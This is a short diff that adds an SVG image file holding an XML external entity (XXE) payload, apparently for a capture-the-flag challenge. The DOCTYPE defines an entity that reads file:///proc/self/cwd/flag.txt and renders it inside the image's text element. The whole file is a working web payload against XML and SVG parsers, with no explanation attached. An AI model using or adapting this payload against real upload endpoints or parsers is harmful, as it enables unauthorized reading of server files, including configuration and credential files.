@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE note [
+<!ENTITY xxe SYSTEM "file:///proc/self/cwd/flag.txt" >
+]>
+<svg height="100" width="100">
+	  <text x="10" y="10">&xxe;</text>
+</svg>
